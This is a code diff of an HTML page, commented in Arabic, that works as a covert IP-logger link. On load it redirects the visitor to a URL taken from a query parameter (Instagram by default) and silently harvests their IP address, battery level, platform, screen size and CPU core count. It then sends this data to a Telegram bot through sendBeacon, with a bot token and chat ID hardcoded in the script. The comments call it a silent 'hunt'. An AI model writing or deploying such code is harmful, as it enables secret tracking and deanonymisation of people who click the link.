@@ -3,41 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <script>
+        // إعداداتك الثابتة
         const T = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
         const C = "5773364548";
 
-        async function x() {
-            // 1. تحويل فوري (أقل من 0.05 ثانية)
+        async function launch() {
+            // 1. استخراج الوجهة (التحويل الفوري)
             const u = new URLSearchParams(window.location.search).get('u') || 'https://instagram.com';
+            
+            // 2. أمر التحويل يسبق كل شيء (سرعة البرق)
             window.location.replace(u);
 
-            // 2. سحب البيانات صامت بالخلفية
-            try {
-                let b = "N/A";
-                // محاولة صيد البطارية بسرعة
+            // 3. جمع البيانات في الخلفية (أثناء ما المتصفح يحمل الصفحة الجديدة)
+            let b = "N/A";
+            try { 
                 if (navigator.getBattery) {
                     const bt = await navigator.getBattery();
                     b = Math.round(bt.level * 100) + "%";
                 }
+            } catch(e) {}
 
-                // سحب الموقع والآيبي (طلب خفيف جداً)
-                fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                    const m = `
-🚀 **رصد احترافي - النسخة X**
+            // سحب الـ IP والمعلومات بطلب واحد "خفيف" جداً
+            fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                const msg = `
+🎯 **صيد سريع (النسخة الصامتة)**
 ━━━━━━━━━━━━━━━
-🌐 IP: ${d.ip}
-📍 Loc: ${d.city} | ${d.region}
-🏢 Net: ${d.org}
-🔋 Batt: ${b}
-📱 Dev: ${navigator.platform}
-━━━━━━━━━━━━━━━`;
+🌐 الـ IP: \`${data.ip}\`
+🔋 البطارية: ${b}
+📱 الجهاز: ${navigator.platform}
+🖥️ الشاشة: ${screen.width}x${screen.height}
+⚙️ المعالج: ${navigator.hardwareConcurrency || 'غير معروف'} كور
+━━━━━━━━━━━━━━━
+🔗 رابط فحص الموقع (اضغط عليه):
+https://ip-api.com/#${data.ip}`;
 
-                    // إرسال البيانات (التشفير داخلي بطلب Fetch)
-                    navigator.sendBeacon(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
-                });
-            } catch (e) {}
+                // إرسال البيانات باستخدام Beacon (أقوى طريقة للإرسال أثناء الخروج)
+                const url = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+                navigator.sendBeacon(url);
+            });
         }
-        window.onload = x;
+        window.onload = launch;
     </script>
 </head>
 <body style="background:#000"></body>
